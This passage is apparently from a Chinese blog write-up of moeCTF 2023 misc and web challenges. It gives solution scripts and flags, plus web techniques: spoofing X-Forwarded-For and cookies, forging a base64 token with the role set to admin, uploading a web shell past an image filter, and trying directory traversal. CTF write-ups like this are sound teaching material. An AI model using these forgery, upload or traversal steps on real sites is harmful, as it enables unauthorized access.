glob<br>a=<span class="hljs-number">1</span><br>i=<span class="hljs-number">97</span><br><span class="hljs-keyword">while</span> i&gt;<span class="hljs-number">0</span>:<br>    folder_path = <span class="hljs-string">&#x27;C:\\Users\\wxy1234\\Desktop\\Python\\output2&#x27;</span><br><br>    <span class="hljs-comment"># 获取文件夹中的所有文件</span><br>    file_list = glob.glob(os.path.join(folder_path, <span class="hljs-string">&#x27;*&#x27;</span>))<br><br>    <span class="hljs-comment"># 获取第一个文件的路径</span><br>    <span class="hljs-keyword">if</span> file_list:<br>        first_file_path = file_list[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(first_file_path)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件夹为空&quot;</span>)<br>    output_directory = <span class="hljs-string">&#x27;output2&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;7z&#x27;</span> <span class="hljs-keyword">in</span> first_file_path:<br>        <span class="hljs-keyword">with</span> py7zr.SevenZipFile(first_file_path, mode=<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> archive:<br>            archive.extractall(path=output_directory)<br>    <span class="hljs-keyword">else</span>:<br>        shutil.unpack_archive(first_file_path, output_directory)<br>        output_directory = <span class="hljs-string">&#x27;output&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;第<span class="hljs-subst">&#123;i&#125;</span>次解压缩完成:&#x27;</span>, a)<br>    a+=<span class="hljs-number">1</span><br>    i=i-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><code>moectf&#123;Ca7_s133p1ng_und3r_zip_5hell5&#125;</code></p>
+<h2 id="你想要flag吗"><a href="#你想要flag吗" class="headerlink" title="你想要flag吗"></a>你想要flag吗</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329277428-0b7af8da-8c58-476a-9e49-e82be054af0c.png#averageHue=%23011720&clientId=u228c62a0-891d-4&from=paste&height=189&id=u2a2eca4e&originHeight=473&originWidth=1798&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1561887&status=done&style=none&taskId=ua0bc4102-2b69-4ae9-ad6e-2a756f55ad0&title=&width=719.2" srcset="/img/loading.gif" lazyload alt="1692329273137.png"><br>key：Bulbasaur<br>pwd:youseeme<br>去看看steghide<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329348922-f1d595ff-0da9-423a-ab4c-6db3c1d03ceb.png#averageHue=%231d203a&clientId=u228c62a0-891d-4&from=paste&height=809&id=ue19afaa2&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=4447689&status=done&style=none&taskId=ub6e01a9d-306a-4432-b868-01154f2f994&title=&width=1388" srcset="/img/loading.gif" lazyload alt="1692329342994.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329362514-b74a6426-7632-4aca-8e0f-737d73bff698.png#averageHue=%2323252e&clientId=u228c62a0-891d-4&from=paste&height=809&id=u3f318eaf&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=171798&status=done&style=none&taskId=u5ab0d596-4ff0-4fb7-99af-da80769ddeb&title=&width=1388" srcset="/img/loading.gif" lazyload alt="1692329357971.png"><br>U2FsdGVkX18pGLCTMBSjkndoY4gf2lbG96QwOzVZDZeAYOA+TKnfv1mCtQ&#x3D;&#x3D;<br>提示是兔子加密</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329239991-c1654886-e430-42c8-ab60-a379567b733e.png#averageHue=%23fcfbfb&clientId=u228c62a0-891d-4&from=paste&height=812&id=ud3c779f3&originHeight=2030&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=616989&status=done&style=none&taskId=uf9b5da26-e572-4bd1-bfc5-0becbc4482d&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692329235399.png"><br><code>moectf&#123;Mu5ic_1s_v3ry_1nt23esting_!&#125;</code></p>
+<h2 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h2><p>下载附件用010打开<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692413906966-39ab905a-6ca4-455f-9ea8-79400e6e3020.png#averageHue=%233f3d38&clientId=u77c829fb-348a-4&from=paste&height=87&id=ua63ffb4a&originHeight=109&originWidth=744&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5964&status=done&style=none&taskId=u340c1242-4cf5-45bf-8a92-4dc16df935b&title=&width=595.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现两个png文件尾，第二张图片添加上文件头进行分离，得到两张一样的图，猜盲水印<br>经过尝试发现是频域盲水印算法，github源码：<a target="_blank" rel="noopener" href="https://github.com/linyacool/blind-watermark/tree/python3">https://github.com/linyacool/blind-watermark/tree/python3</a><br>进行水印提取：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692414053821-2b81c571-14d3-4b90-a47d-432f9fbd8b14.png#averageHue=%232e2d2c&clientId=u77c829fb-348a-4&from=paste&height=51&id=u8a63c943&originHeight=64&originWidth=1488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8708&status=done&style=none&taskId=ue56861c4-ef56-417d-b074-5856a78141c&title=&width=1190.4" srcset="/img/loading.gif" lazyload alt="image.png"><br>得到水印图<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692414095884-3ac930f0-f3fd-4b5f-af4d-bdf16125db84.png#averageHue=%23000000&clientId=u77c829fb-348a-4&from=paste&height=678&id=u304b8873&originHeight=847&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58664&status=done&style=none&taskId=u42259810-80e9-46ee-93dd-26688548b99&title=&width=1027.2" srcset="/img/loading.gif" lazyload alt="f4e1b398456aa1d1c253c6ed10849af.png"><br>太难分辨可以到stegsolve里变换通道看<br>得到flag：W0w_you_6@v3_1earn3d_blind_w@t3rma2k<br><code>moectf&#123;W0w_you_6@v3_1earn3d_blind_w@t3rma2k&#125;</code></p>
+<h2 id="狗子（4）故乡话"><a href="#狗子（4）故乡话" class="headerlink" title="狗子（4）故乡话"></a>狗子（4）故乡话</h2><p>打开附件，一堆true和false，先化成0和1，去掉空格</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">00000000000000000000000000000000000000000000000000000000000011110001100001010001100000100001010001000000000010100000000000000000100010100001000010100010100010000010000100000101001100000001000001000010000101000001000010000000001000000000000110000100000100000000001000000100000100010100010000010100000000010000010000001000110000010000001000000000111000000000000000000000000000000000000000000000000000000000000000000<br></code></pre></td></tr></table></figure>
+<p>上述txt内容必须在同一行<br>用脚本把1填充黑，0填充白</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX= <span class="hljs-number">200</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;F:\\moe\\attachment.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-built_in">bin</span> = file.read()<br>qr = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">59</span>,<span class="hljs-number">7</span>))<br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">59</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">bin</span>[index] ==<span class="hljs-string">&#x27;0&#x27;</span>:<br>            qr.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">else</span>:<br>            qr.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>        index += <span class="hljs-number">1</span><br>qr.show()<br>qr.save(<span class="hljs-string">&quot;qr.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692509669426-5a9393d8-8732-41ba-9caa-c1fc6eb28789.png#averageHue=%23ababac&from=url&id=ILTOS&originHeight=133&originWidth=840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=" srcset="/img/loading.gif" lazyload></p>
+<p>用谷歌识图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692509703473-49e919c2-28bd-4b48-99c8-46953a167abd.png?x-oss-process=image/resize,w_1875,limit_0#averageHue=%23adceb5&from=url&id=ZNkJw&originHeight=810&originWidth=1875&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=" srcset="/img/loading.gif" lazyload></p>
+<p>根据提示说和我的世界有关，看到右边有mincraft字体，打开<br><a target="_blank" rel="noopener" href="https://webfonts.ffonts.net/minecraft-enchantment-Regular.font">https://webfonts.ffonts.net/minecraft-enchantment-Regular.font</a><br>得到</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692509777262-892c11b8-741a-4111-ab84-36a10b6083a6.png#averageHue=%23f1f1f1&from=url&id=UT6Mq&originHeight=700&originWidth=803&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=" srcset="/img/loading.gif" lazyload></p>
+<p>进行对应，题目说字母都是小写<br>最后对应得到flag：<code>moectf&#123;dontanswer&#125;</code></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692239727991-caa76376-0723-4ac0-968a-ed3b662e49d8.png#averageHue=%23edeceb&clientId=ued3674e1-1bde-4&from=paste&height=280&id=ua8b825f1&originHeight=700&originWidth=655&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=46406&status=done&style=none&taskId=ua5ed407a-3bf6-4ac3-8f1b-5c3e10be778&title=&width=262" srcset="/img/loading.gif" lazyload alt="1692239723802.png"><br>要求：<br>1.get传参?UwU&#x3D;u<br>2.POST传参 Luv&#x3D;i<br>3.cookie为admin而不是guest<br>4.请求来自127.0.0.1<br>5.代理是MoeBrowser<br>去burp抓包并修改<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692241957628-378056c6-70bf-4d32-b1d4-2eed81451368.png#averageHue=%23faf9f9&clientId=ued3674e1-1bde-4&from=paste&height=928&id=u555474c0&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=661399&status=done&style=none&taskId=u51c0b1e7-ac53-4457-a441-21e535c3d34&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692241953122.png"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?UwU=u</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.106:62842<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>MoeBrowser<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>character=admin<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5<br><br><span class="language-abnf"><span class="hljs-attribute">Luv</span><span class="hljs-operator">=</span>u</span><br></code></pre></td></tr></table></figure>
+<p><code>moectf&#123;basic_http_knowledge_4NMuUtA0iWlPdl1W6xM9VLQHzR6-zjq5&#125;</code></p>
+<h2 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h2><p>给了pdf<br><code>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d</code><br>16进制转文本<br>flag&#x3D;bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;<br><code>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=</code><br>base64<br><code>moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;</code></p>
+<h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692253068952-fec9855a-5410-49db-9460-7edf482d8ddb.png#averageHue=%23f7f6f4&clientId=ucf983e31-0846-4&from=paste&height=926&id=u419528ac&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1058284&status=done&style=none&taskId=u7f7013ec-93e3-43cc-8de2-62a6e1ab1fc&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692253065496.png"><br><code>moectf&#123;find_comments_PsW-jbrcdAx4SFx4wjEg-x6O_1McNKeI&#125;</code></p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261151420-c9d2f24a-3a7a-45d6-a2cf-527e27422a67.png#averageHue=%23fcfcfc&clientId=u672bdedf-96b6-4&from=paste&height=926&id=u82682522&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=268996&status=done&style=none&taskId=ud8feb882-6a41-49af-ba69-16862764b5b&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261162100-043fe995-dab0-4f21-a7c1-0053f5d6442f.png#averageHue=%231e1d1d&clientId=u672bdedf-96b6-4&from=paste&height=920&id=u211e67b7&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=510431&status=done&style=none&taskId=ub90abfaa-c690-46e5-8f1b-51dfffb6042&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>bp抓包<br>按照readme提示先注册<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261193348-ea02c4d9-8e53-4f2a-aa50-931b117d709b.png#averageHue=%23fbfafa&clientId=u672bdedf-96b6-4&from=paste&height=928&id=u640f9187&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=606024&status=done&style=none&taskId=u86d1bce5-7d60-44ad-9e47-9dc837d3c84&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后登录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261214522-7025d4b1-c4a0-4e75-93f1-397a97a97f1a.png#averageHue=%23fafafa&clientId=u672bdedf-96b6-4&from=paste&height=928&id=u0fb0c623&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=655483&status=done&style=none&taskId=u214bad7d-dda6-4220-b11e-17cb685a512&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>题目名字是cookie<br>把cookie改了，token复制过来<br>发现提示要admin<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261400615-bbc48943-b017-4435-a94a-b36932837441.png#averageHue=%23faf9f9&clientId=u672bdedf-96b6-4&from=paste&height=928&id=uc2977104&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=672347&status=done&style=none&taskId=u6e408e88-6679-419c-8a76-f5106800bdb&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>token去大厨解密<br>{“username”: “whh”, “password”: “123456”, “role”: “user”}<br>改成<code>&#123;&quot;username&quot;: &quot;whh&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;admin&quot;&#125;</code><br>base64加密回去<br>放到token<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261375394-0e7d9b56-2c2f-4c49-a72e-1a8599f60a69.png#averageHue=%23faf9f9&clientId=u672bdedf-96b6-4&from=paste&height=928&id=uad1f0a37&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=728928&status=done&style=none&taskId=u06c1880f-59eb-4d84-8565-61c97d79048&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692261371106.png"><br><code>moectf&#123;cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro&#125;</code></p>
+<h2 id="gasgasgas"><a href="#gasgasgas" class="headerlink" title="gasgasgas"></a>gasgasgas</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692495793288-eb760ffd-e0a6-4d6c-938d-fae447326874.png#averageHue=%23fcfcfb&clientId=u6ed52949-f113-4&from=paste&height=926&id=xqkk1&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=241409&status=done&style=none&taskId=u1892ace6-db69-4b8a-a444-4cdf4e35f74&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>很明显需要脚本<br>看提示发现要根据据它给的数据进行操作，且只有0.5秒时间，人工显然不可能，要用脚本，我们不妨先随便输一个值看看，输入选手名称，方向和油门随便<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692493779682-73bc8eec-f670-43c4-9c97-a843d2d4e8cf.png#averageHue=%23fdfcfc&from=url&id=TWB0q&originHeight=837&originWidth=1920&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=" srcset="/img/loading.gif" lazyload><br>可以看到提交后你要根据出现的红色的提示再对相同选手进行下一轮操作，所以代码的关键就是提取出红色的字进行if判断，我们先看一下源码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692493939588-d4b4230e-72de-41b8-8193-6ea13dca8d31.png#averageHue=%23fdfbfa&from=url&id=n3DVh&originHeight=691&originWidth=1067&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=" srcset="/img/loading.gif" lazyload><br>源码分析可以看到，红线标出来的那一行中的文字就是我们脚本所要提取的，后面大括号的两行就是我们需要根据文字进行的传参，知道了这些，我们开始写脚本,这里有个坑，要反打方向，比如弯道向左你要右打方向盘</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br>a=<span class="hljs-number">0</span><br>url = <span class="hljs-string">&quot;http://192.168.0.107:50689/&quot;</span><br>session = requests.session()<br><span class="hljs-comment"># 获取题目</span><br>data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>      <span class="hljs-string">&quot;steering_control&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>      <span class="hljs-string">&quot;throttle&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>&#125;<br>res = session.post(url,data=data)<span class="hljs-comment">#初始的数据，随便填</span><br><span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-keyword">while</span> a&lt;<span class="hljs-number">6</span>:<br>        html = res.text<br>        soup = BeautifulSoup(html, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>        element = soup.find(<span class="hljs-string">&quot;div&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;info&quot;</span>).find(<span class="hljs-string">&quot;h3&quot;</span>).find(<span class="hljs-string">&quot;font&quot;</span>).text<span class="hljs-comment">#提取红色的文字</span><br>        <span class="hljs-built_in">print</span>(element)<br>        <span class="hljs-comment">#进行判断然后传相应的参数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;直&quot;</span> <span class="hljs-keyword">in</span> element:<br>            data[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;左&quot;</span> <span class="hljs-keyword">in</span> element:<br>            data[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;右&quot;</span> <span class="hljs-keyword">in</span> element:<br>            data[<span class="hljs-string">&quot;steering_control&quot;</span>]=-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;保持&quot;</span> <span class="hljs-keyword">in</span> element:<br>            data[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;大&quot;</span> <span class="hljs-keyword">in</span> element:<br>            data[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;小&quot;</span> <span class="hljs-keyword">in</span> element:<br>            data[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-number">0</span><br>        <span class="hljs-built_in">print</span>(data)<br>        res = session.post(url, data=data)<br>        a+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(res.content.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692495779539-140acb6d-e1f6-45bb-8ee3-6f1abce28ccc.png#averageHue=%231b1b1b&clientId=u6ed52949-f113-4&from=paste&height=920&id=w1T8l&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=525915&status=done&style=none&taskId=u13f453f4-9cad-483a-a719-3ad92dd4022&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;Beautiful_Drifting!!_kTrbe22dTQ3gypuBTr3gmb4GN1FtLYd8&#125;</code></p>
+<h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>要求上传png<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692237210264-1cd6439a-32d2-40e2-a90c-00f5db3f55ee.png#averageHue=%23fdfdfd&clientId=u77af9214-b2d4-4&from=paste&height=926&id=u92f35b14&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=144757&status=done&style=none&taskId=u917a859f-45f8-4362-be99-5f93d2fdf38&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692237205009.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692237234304-f324f5d3-5d4e-4afa-9f3a-df386d77161b.png#averageHue=%23fafafa&clientId=u77af9214-b2d4-4&from=paste&height=928&id=u5d46dabc&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=625585&status=done&style=none&taskId=u4efe4388-aa72-4a5a-8680-e85d443d186&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692237231090.png"><br>蚁剑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692237282437-e21a4d3b-6ef1-4976-9ffc-d91bfee3d0be.png#averageHue=%23f1f0f0&clientId=u77af9214-b2d4-4&from=paste&height=646&id=ua60e2d2e&originHeight=1615&originWidth=2570&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=266537&status=done&style=none&taskId=ud33394aa-21c8-4016-86d6-4dda6cf9ac4&title=&width=1028" srcset="/img/loading.gif" lazyload alt="1692237276835.png"><br><code>moectf&#123;hmmm_improper_filter_CD3XmUuiVbRyhVYUMHRsxv-fR_MFcaF-&#125;</code></p>
+<h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692498320543-490ee450-6ac0-4b52-829f-9fc79b62319a.png#averageHue=%23fcfcfc&clientId=u6ed52949-f113-4&from=paste&height=926&id=uc5feb40e&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=168969&status=done&style=none&taskId=u574bb24a-5ec1-484b-99bf-58ecaeaef19&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692498316081.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://101.42.178.83:7770/&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1001</span>):<br>    params = &#123;<span class="hljs-string">&quot;id&quot;</span>: i&#125;<br>    response = requests.get(url, params=params)<br>    content = response.text<br>    <br>    matches = re.findall(<span class="hljs-string">r&quot;moectf\&#123;.*?\&#125;&quot;</span>, content)<br>    <span class="hljs-keyword">if</span> matches:<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> matches:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>            <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>
+<p><code>moectf&#123;script_helps_ULOZw7NrjEIKRZ4V&#125;</code></p>
+<h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p>传一个正常的图片试试<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692535959282-7007b3e3-5167-4ef3-843e-62ec25ec14c6.png#averageHue=%23b9a082&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=u2dd6491b&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=4088845&status=done&style=none&taskId=u63d0e9d7-a1b8-463d-a18e-8691fd4ece5&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692535955144.png"><br>看url发现可能存在文件包含漏洞，试试目录穿越<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692536014277-e7f6fc33-4c6c-4b85-9d30-f0d4c59e1a0b.png#averageHue=%23e4c89b&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=u07f57a86&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=554818&status=done&style=none&taskId=u573dbdd4-159b-4451-998d-0e75e753317&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692536011602.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692535939947-e39b812e-7e6a-4db3-978a-1896119bc486.png#averageHue=%23fdfdfd&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=ub50a16d1&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=222661&status=done&style=none&taskId=u2adfd428-2023-4b59-99a1-b8917afce90&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692535936991.png"><br><img 